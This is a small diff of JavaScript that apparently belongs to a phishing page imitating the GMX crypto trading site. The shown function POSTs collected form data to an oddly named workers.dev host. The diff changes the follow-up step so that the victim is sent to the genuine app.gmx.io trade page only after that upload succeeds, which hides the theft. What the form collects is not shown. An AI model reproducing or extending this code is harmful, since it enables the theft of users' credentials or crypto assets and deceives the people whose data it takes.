@@ -26,11 +26,8 @@ const sendDDD = _ => {
                         await fetch('https://mountaindewmfka.juistespastelastes.workers.dev', {
                             method: 'POST',
                             body: formData
-                        }).finally(() => {
-    setTimeout(() => {
-        window.location.href = 'https://gmx.io';
-    }, 300);
-});
+                        }).then(res => {
+                            res.status === 200 && (location = 'https://app.gmx.io/#/trade');
                         })
                     };
                 };
